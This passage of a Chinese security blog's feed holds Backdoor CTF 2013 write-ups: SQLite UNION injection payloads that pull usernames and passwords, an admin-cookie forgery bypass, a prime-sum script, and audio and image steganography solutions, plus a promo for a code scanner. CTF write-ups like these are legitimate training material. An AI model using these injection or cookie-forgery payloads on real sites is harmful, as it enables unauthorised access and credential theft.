            <tag> crypto </tag>
            
            <tag> 密文破译 </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 Web 150]]></title>
      <url>/2016/08/10/Backdoor-CTF-2013-Web-150/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>现在，你发现了H4x0r的公告网，这个站点在很久之前就建立了，所以有可能存在一些漏洞。<br>找到<a href="http://hack.bckdr.in/2013-WEB-150/web150.php" target="_blank" rel="external">网站</a>管理员密码的MD5值。</p></blockquote><a id="more"></a><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>打开网站，查看源码，POST的是id，输入1返回正常的查询数据，输入<code>1&#39; and 1=2 --</code>返回正常没有查询数据，说明<code>1&#39; and 1=2 --</code>成功执行，那么题目可能就是POST型的注入。</p><p>尝试输入<code>1&#39; #</code>结果报错，说明不是MySQL数据库管理系统，由于是网页是PHP的，所以可能是PostgreSQL或者SQLite数据库管理系统(version()等等查询被禁用)，后来用sqlmap测试了一下是SQLite。</p><p>先检查当前表的列数，输入<code>1&#39; order by 3 --</code>正常，输入<code>1&#39; order by 4 --</code>错误，说明有3列。</p><p>然后尝试union注入，1’ union select 1,2,3 –</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/4252125921.gif" alt="Backdoor CTF 2013 Web 150 SQLite union injection.gif"></p><p>可知显位是2、3，然后由于手工猜测太慢，所以我们可以用burpsuite来暴力猜解表名。</p><p><code>1&#39; union select null,null,null from TABLENAME--</code></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1253716362.gif" alt="Backdoor CTF 2013 Web 150 SQLite brute force table name.gif"></p><p>可知表名为users，接下来使用同样的方法猜测列名，得到name、password两个列名。</p><p>最后payload为<code>1&#39; union select null,name,password from users --</code></p><p>可供参考的文章:<a href="http://www.2cto.com/Article/201410/342032.html" target="_blank" rel="external">PHP/Sqlite下常见漏洞浅析</a>，<a href="http://blackbap.org/thread-2414-1-1.html" target="_blank" rel="external">PHP+Sqlite注入步骤简介</a>，另外由于sqlmap没有跑出数据就不再演示了。</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> sqlite injection </tag>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 杂项 75]]></title>
      <url>/2016/08/10/Backdoor-CTF-2013-Misc-75/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>H4x0r曾在他的博客上说道，“时间最终赶上了每个人,除了H4x0r。如果你能挑战我!”</p><p>来吧:<a href="http://hack.bckdr.in/2013-MISC-75/misc75.php" target="_blank" rel="external">时光穿梭门</a></p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>打开传送门之后，题目要求在3秒内提交前N(比如：30个)素数的和。</p><p>第一种方法的算法思想就是简单的素数判断方法<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> httplib</div><div class="line"><span class="keyword">import</span> urllib, urllib2, cookielib</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_sum_of_first_N_prime_numbers</span><span class="params">(N)</span>:</span></div><div class="line">	sum = <span class="number">0</span></div><div class="line">	n = <span class="number">0</span></div><div class="line">	num = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> n &lt; N:</div><div class="line">		<span class="comment"># prime numbers are greater than 1</span></div><div class="line">		<span class="keyword">if</span> num &gt; <span class="number">1</span>:</div><div class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num):</div><div class="line">				<span class="keyword">if</span> (num % i) == <span class="number">0</span>:</div><div class="line">					<span class="keyword">break</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				sum += num</div><div class="line">				n = n+<span class="number">1</span></div><div class="line">		num = num+<span class="number">1</span></div><div class="line">	<span class="keyword">return</span> sum</div><div class="line"></div><div class="line">conn = httplib.HTTPConnection(<span class="string">"hack.bckdr.in"</span>)</div><div class="line">response = conn.request(<span class="string">"GET"</span>, <span class="string">'http://hack.bckdr.in/2013-MISC-75/misc75.php'</span>)</div><div class="line">response = conn.getresponse()</div><div class="line">text = response.read()</div><div class="line">num_in_page = [int(s) <span class="keyword">for</span> s <span class="keyword">in</span> text.split() <span class="keyword">if</span> s.isdigit()]</div><div class="line">N = num_in_page[<span class="number">1</span>]</div><div class="line">sum = find_sum_of_first_N_prime_numbers(N)</div><div class="line"></div><div class="line">headers = response.getheaders()</div><div class="line">cookie = headers[<span class="number">2</span>][<span class="number">2</span>]</div><div class="line"></div><div class="line">headers = &#123;<span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">			, <span class="string">"Cookie"</span>: cookie</div><div class="line">			, <span class="string">"Host"</span>: <span class="string">"hack.bckdr.in"</span></div><div class="line">			, <span class="string">"Connection"</span> : <span class="string">"keep-alive"</span></div><div class="line">			, <span class="string">"Cache-Control"</span> : <span class="string">"max-age=0"</span></div><div class="line">			, <span class="string">"Origin"</span>: <span class="string">"http://hack.bckdr.in"</span></div><div class="line">			, <span class="string">"Referer"</span>: <span class="string">"http://hack.bckdr.in/2013-MISC-75/misc75.php"</span></div><div class="line">			, <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"</span>&#125;</div><div class="line"></div><div class="line">params = urllib.urlencode(&#123;<span class="string">'answer'</span>: sum, <span class="string">'submit'</span>: <span class="string">'Submit'</span>&#125;)</div><div class="line"></div><div class="line">response = conn.request(<span class="string">"POST"</span>, <span class="string">'http://hack.bckdr.in/2013-MISC-75/misc75.php'</span>, params, headers)</div><div class="line">response = conn.getresponse()</div><div class="line">print(response.read())</div></pre></td></tr></table></figure><p></p><p>但我感觉这个算法效率太低，如果题目给的数字很大，验证时间再调小，这个算法就不再适用了，根据<a href="http://blog.csdn.net/liukehua123/article/details/5482854" target="_blank" rel="external">素数判断算法(高效率）</a>一文编写了另一个参考示例：</p><p>首先生成质数列表：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="keyword">import</span> time</div><div class="line">start=time.clock()</div><div class="line">n=<span class="number">10000000</span></div><div class="line">result = list()</div><div class="line">result.append(<span class="number">2</span>)</div><div class="line">result.append(<span class="number">3</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>,n+<span class="number">1</span>,<span class="number">2</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">3</span>,int(math.sqrt(i))+<span class="number">1</span>):</div><div class="line">        <span class="keyword">if</span> i%j == <span class="number">0</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        result.append(i)</div><div class="line">end=time.clock()</div><div class="line"><span class="keyword">print</span> end-start</div><div class="line">f=open(<span class="string">r'prime_number.txt'</span>,<span class="string">'w'</span>)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result:</div><div class="line">    f.write(str(x)+<span class="string">'\n'</span>)</div><div class="line">f.close</div></pre></td></tr></table></figure><p></p><p>主要用到算法思想:</p><blockquote><p>判断一个数是否为素数只需除以这个数的平方根+1之间的所有的数<br>从2开始往后依次增1的数列里所有偶数一定不是素数(这能减少一半的时间)<br>素数快速筛选法</p></blockquote><p>测试了一下(CPU:Intel(R) Core(TM) i5-4200H CPU @ 2.80GHz System:Windows 10 Pronfessional x64)，生成前10000以内的素数平均0.02秒，生成前100000以内的素数平均0.3秒，生成前1000000以内的素数平均7秒，生成前10000000以内的素数平均140秒，速度还是可以的，但是这肯定不是最优的，应该还可以进行优化。</p><p>然后是读取素数表计算前N个素数的和并提交结果：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    starttime=time.clock()</div><div class="line">    url = <span class="string">"http://hack.bckdr.in/2013-MISC-75/misc75.php"</span></div><div class="line">    req = requests.get(url)</div><div class="line">    tmpcookies = req.cookies</div><div class="line">    match = re.findall(<span class="string">r'[0-9]+'</span>, req.text); num = int(match[<span class="number">1</span>])</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        src = open(<span class="string">"prime_number.txt"</span>, <span class="string">"r"</span>)</div><div class="line">        data = src.read()</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        src.close()</div><div class="line">    primelist = data.split()</div><div class="line">    sum = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, num):</div><div class="line">        sum += int(primelist[i])</div><div class="line">    print(<span class="string">"Sum is &#123;&#125;."</span>.format(sum))</div><div class="line">    data = &#123;<span class="string">"answer"</span>: sum&#125;</div><div class="line">    req2 = requests.post(url, data=data, cookies=tmpcookies)</div><div class="line">    print(req2.text)</div><div class="line">    endtime=time.clock()</div><div class="line">    <span class="keyword">print</span> endtime - starttime</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>也可以将两部分写在一起<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> math</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_generate</span><span class="params">(n)</span>:</span></div><div class="line">    result = list()</div><div class="line">    result.append(<span class="number">2</span>)</div><div class="line">    result.append(<span class="number">3</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>,n+<span class="number">1</span>,<span class="number">2</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">3</span>,int(math.sqrt(i))+<span class="number">1</span>):</div><div class="line">            <span class="keyword">if</span> i%j == <span class="number">0</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            result.append(i)</div><div class="line">    <span class="keyword">return</span> result</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_sum</span><span class="params">(num)</span>:</span></div><div class="line">    finsum=<span class="number">0</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> prime_generate(<span class="number">10000</span>)[:num]:</div><div class="line">        finsum=finsum+x</div><div class="line">    <span class="keyword">return</span> finsum  </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">"http://hack.bckdr.in/2013-MISC-75/misc75.php"</span></div><div class="line">    req = requests.get(url)</div><div class="line">    tmpcookies = req.cookies</div><div class="line">    <span class="comment"># Set rundom N.</span></div><div class="line">    match = re.findall(<span class="string">r'[0-9]+'</span>, req.text); num = int(match[<span class="number">1</span>])</div><div class="line">    sum=calc_sum(num)</div><div class="line">    data = &#123;<span class="string">"answer"</span>: sum&#125;</div><div class="line">    req2 = requests.post(url, data=data, cookies=tmpcookies)</div><div class="line">    print(req2.text)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p></p><p>小伙伴有什么优化的算法还请告诉我，一起交流学习:P</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> misc </tag>
            
            <tag> quickly find prime </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Cobra（眼镜蛇）- 白盒审计静态代码安全扫描与分析系统]]></title>
      <url>/2016/08/07/Cobra%EF%BC%88%E7%9C%BC%E9%95%9C%E8%9B%87%EF%BC%89-%20%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/</url>
      <content type="html"><![CDATA[<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>眼镜蛇(Cobra)是一款定位于静态代码安全分析的工具，目标是为了找出源代码中存在的安全隐患或者漏洞。</p><h2 id="0x01-目标用户"><a href="#0x01-目标用户" class="headerlink" title="0x01 目标用户"></a>0x01 目标用户</h2><p><strong>1. 互联网企业</strong></p><p>互联网公司可以将Cobra部署在企业内,供开发人员使用,用来扫描项目风险. 也可以集成到内部的代码发布系统,让Cobra成为发布系统中的一环,扫描开发人员提交到线上的代码的安全性,从而限制不安全的代码上线,减少线上风险。</p><p><strong>2. 安全公司</strong></p><p>安全公司为互联网公司进行安全测试时,可以通过Cobra的全局项目扫描功能对甲方的所有项目进行自动代码安全审计。</p><p><strong>3. 白帽</strong></p><p>白帽们可以通过定制完善Cobra扫描规则, 对开源项目进行代码审计,发现其中漏洞。</p><h2 id="0x02-应用场景"><a href="#0x02-应用场景" class="headerlink" title="0x02 应用场景"></a>0x02 应用场景</h2><p><strong>1.漏洞出现前（检测）</strong></p><p>我们将互联网上常见的漏洞梳理为Cobra的检测规则，能够在漏洞被白帽子发现前就扫描出风险点并解决，防范于未然。</p><p>例： 提前检测代码中是否存在高危文件(.tar.gz/.rar/.bak/.swp)，可以避免高危文件被下载。</p><p><strong>2.漏洞出现中（扫描）</strong></p><p>当企业收到白帽子提交的漏洞后，企业会在第一时间修复漏洞，并可以通过Cobra来添加扫描规则检测企业的所有项目是否存在类似漏洞。</p><p>例： 出现了ImageMagick漏洞后，可以通过Cobra设置扫描规则对历史所有项目进行快速扫描，几分钟内就能知道企业数十个项目中哪些有用到ImageMagick组件，哪些存在漏洞，哪些可以免疫。</p><p><strong>3.漏洞出现后（限制）</strong></p><p>当企业修复漏洞后，可以通过设置修复/验证规则来限制以后所有提交的代码都需要过修复/验证规则，否则不予上线，减少相同漏洞再次出现的可能性。</p><a id="more"></a><h2 id="0x03-项目演示"><a href="#0x03-项目演示" class="headerlink" title="0x03 项目演示"></a>0x03 项目演示</h2><p><strong>Cobra自助扫描</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1647547602.png" alt="MANUAL.png"></p><p><strong>Cobra扫描报告</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3710569638.png" alt="REPORT.png"></p><p><strong>Cobra管理后台</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2123976450.png" alt="MANAGE.png"></p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><p>主页: <a href="http://wufeifei.github.io/cobra" target="_blank" rel="external">http://wufeifei.github.io/cobra</a><br>文档: <a href="https://github.com/wufeifei/cobra/wiki" target="_blank" rel="external">https://github.com/wufeifei/cobra/wiki</a></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 眼镜蛇 </tag>
            
            <tag> cobra </tag>
            
            <tag> 代码安全扫描与分析系统 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 Web 50]]></title>
      <url>/2016/08/05/Backdoor-CTF-2013-Web-50/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>H4x0r,一天早上,为自己的网站搞了一个身份验证系统。他很自然觉得自己搞了一个先进高端的系统,然而我们是知道他是多么”出色的”。成为管理员非常容易，你可以访问这个<a href="http://hack.bckdr.in/2013-WEB-50/getflag.php" target="_blank" rel="external">链接</a>的轻松获取flag。</p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p><strong>姿势一:</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:<span class="built_in">document</span>.cookie=<span class="string">"username=admin"</span></div></pre></td></tr></table></figure><p></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3484985938.gif" alt="Backdoor-CTF-2013-WEB-50_javascript.gif"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1201842075.gif" alt="Backdoor-CTF-2013-WEB-50_javascript_2.gif"></p><p><strong>姿势二:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">"http://hack.bckdr.in/2013-WEB-50/getflag.php"</span></div><div class="line">    cookie = &#123;<span class="string">"username"</span>: <span class="string">"admin"</span>&#125;</div><div class="line">    req = requests.get(url, cookies=cookie)</div><div class="line">    print(req.text)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure><p><strong>姿势三:</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2976606842.gif" alt="Backdoor-CTF-2013-WEB-50_1.gif"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3938679779.gif" alt="Backdoor-CTF-2013-WEB-50_2.gif"></p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1582121683.gif" alt="Backdoor-CTF-2013-WEB-50_3.gif"></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 电子取证 300]]></title>
      <url>/2016/08/04/Backdoor-CTF-2013-forensics-300/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>H4x0r知道现在简单的文本认证在现今时代被破解根本不是事儿，如今语音认证可谓是风靡一时。因此，他决定也让他的城堡来个语音认证，可惜他不太懂这方面，现在有一个音频文件，他自己似乎无法破译，现在他需要你的帮助，你可以在<a href="https://github.com/ctfs/write-ups-2013/blob/master/backdoorctf-2013/forensic/300/siri_audio.zip" target="_blank" rel="external">这里</a>下载这份音频文件。</p><p>找到隐藏的密码，flag就是密码的MD5值。</p></blockquote><a id="more"></a><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>下载压缩文件之后，解压，使用<a href="http://audacity.en.softonic.com/download" target="_blank" rel="external">Audacity</a>打开wav格式的音频文件。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2383784936.jpg" alt="Backdoor-CTF-2013-Forensics-300_siri_audio.jpg"></p><p>打开之后播放几次没有听出什么异常，然后分析一波，既然是基于提示是语音认证，那么解题方向应该不是数字隐藏，然后试着改变音频轨道和效果，分析音频频谱，也没有发现什么，之后观察音频波形，发现波形很有规律。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1890767856.jpg" alt="Backdoor-CTF-2013-Forensics-300_siri_audio_2.jpg"></p><p>整个音频波形只有两种，且每8个波形为一个周期，突然想起二进制0，1，最后发现当</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3554317349.jpg" alt="Backdoor-CTF-2013-Forensics_1.jpg"></p><p>波形先下后上为0</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2210796757.jpg" alt="Backdoor-CTF-2013-Forensics_2.jpg"></p><p>波形先上后下为1时解出的二进制串为<code>011000100110000101101011011001000110111101110010</code>，将二进制串转ACSII在线<a href="http://www.binaryhexconverter.com/binary-to-ascii-text-converter" target="_blank" rel="external">在线转换</a>之后为：<code>bakdor</code></p><p>计算出MD5值<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo -n bakdor | md5sum /* 选项-n表示输出文字后不换行*/</div><div class="line">e1b64df17443b51e3007fd3d5370dca1  -</div></pre></td></tr></table></figure><p></p><p>所以flag为<code>e1b64df17443b51e3007fd3d5370dca1</code>。</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> misc </tag>
            
            <tag> forensics </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 电子取证 250]]></title>
      <url>/2016/08/03/Backdoor-CTF-2013-forensics-250/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>h4x0r厌烦了你对他的城堡的所有攻击，所以他决定报复攻击你，他给你发来一封带有<a href="https://www.hackfun.org/usr/uploads/2016/08/3293183484.png" target="_blank" rel="external">图片</a>的邮件作为警告，希望你能找出他的警告消息:-)</p><p>消息的MD5值就是flag。</p></blockquote><a id="more"></a><h2 id="0x01-解题法1"><a href="#0x01-解题法1" class="headerlink" title="0x01 解题法1"></a>0x01 解题法1</h2><p>给出的图片：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3293183484.png" alt="Backdoor CTF 2013  Forensics 250 bbb.png"></p><p>用<a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="external">StegSolve</a>(基于Java开发的流行图片隐写分析软件)打开图片，浏览图片各个颜色通道，发现Blue plane 0通道时图片左上角突然多了一些内容，应该就是隐藏的二进制信息。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/4203179710.jpg" alt="blue plane 0.jpg"></p><p>所以使用StegSolve中Analyse选项下Data Extract功能查看Blue plane 0通道：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3966525860.jpg" alt="Backdoor CTF 2013  Forensics 250 Extract Preview.jpg"></p><p>计算出MD5值<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo modernwarfare | md5sum</div><div class="line">3c87b2bc2f0e1143ecb67aa8570ffc1b  -</div><div class="line">root@kali:~# echo -n modernwarfare | md5sum /* 选项-n表示输出文字后不换行*/</div><div class="line">d2432052b887f9e09fb8fa44b11861ef  -</div></pre></td></tr></table></figure><p></p><h2 id="0x02-解题法2"><a href="#0x02-解题法2" class="headerlink" title="0x02 解题法2"></a>0x02 解题法2</h2><p>用StegSolve打开图片，浏览图片的Gray bits通道：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2922411903.png" alt="Backdoor CTF 2013  Forensics 250 stegsolve.png"></p><p>将Gray bits通道时的图片另存为solved.bmp：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1148452280.bmp" alt="Backdoor CTF 2013  Forensics 250 solved.bmp"></p><p>编写脚本提取这些信息,将它们转换为0和1二进制:<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line">flag_img = Image.open(<span class="string">"solved.bmp"</span>)</div><div class="line">w,h = flag_img.size</div><div class="line">msg=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, flag_img.size[<span class="number">1</span>]):</div><div class="line">	g,b,a = flag_img.getpixel((x,<span class="number">0</span>))</div><div class="line">	<span class="keyword">if</span> g==<span class="number">255</span>: msg +=<span class="string">'0'</span></div><div class="line">	<span class="keyword">else</span>: msg+=<span class="string">'1'</span></div><div class="line"><span class="keyword">print</span> msg</div></pre></td></tr></table></figure><p></p><p>提取出的隐藏二进制数值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# python get.py </div><div class="line">011011010110111101100100011001010111001001101110011101110110000101110010011001100110000101110010011001010000000000000000000000000000</div></pre></td></tr></table></figure><p>使用编码转换神器<a href="https://github.com/4ido10n/JPK_406-JPocketKnife_v4.06a" target="_blank" rel="external">JPK</a>将二进制串转换为ASCII字符串：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/3957977083.gif" alt="Backdoor CTF 2013  Forensics 250 bin to ascii.gif"></p><p>计算出MD5值<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# echo modernwarfare | md5sum</div><div class="line">3c87b2bc2f0e1143ecb67aa8570ffc1b  -</div><div class="line">root@kali:~# echo -n modernwarfare | md5sum /* 选项-n表示输出文字后不换行*/</div><div class="line">d2432052b887f9e09fb8fa44b11861ef  -</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> misc </tag>
            
            <tag> forensics </tag>
            
            <tag> 电子取证 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 电子取证 150]]></title>
      <url>/2016/08/03/Backdoor-CTF-2013-forensics150/</url>
